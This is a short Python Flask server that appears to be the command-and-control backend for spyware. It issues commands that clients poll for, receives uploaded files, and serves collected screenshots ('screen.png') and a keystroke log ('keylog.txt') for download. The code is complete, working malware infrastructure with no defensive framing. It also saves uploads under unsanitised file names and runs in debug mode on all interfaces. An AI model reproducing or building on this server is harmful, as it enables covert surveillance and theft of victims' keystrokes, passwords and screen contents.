from flask import Flask, request, jsonify, send_file
import os

app = Flask(__name__)
UPLOAD_FOLDER = '/tmp'
current_command = {}

@app.route('/setcommand', methods=['POST'])
def set_command():
    global current_command
    current_command = request.json
    return jsonify({"status": "Command updated successfully"}), 200

@app.route('/commands', methods=['GET'])
def get_command():
    return jsonify(current_command), 200

@app.route('/upload', methods=['POST'])
def upload_file():
    file = request.files['file']
    filepath = f'{UPLOAD_FOLDER}/{file.filename}'
    file.save(filepath)
    return jsonify({"status": "File received successfully"}), 200

@app.route('/download')
def download():
    return send_file(f'{UPLOAD_FOLDER}/screen.png', as_attachment=True)

@app.route('/download_log')
def download_log():
    return send_file(f'{UPLOAD_FOLDER}/keylog.txt', as_attachment=True)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000, debug=True)
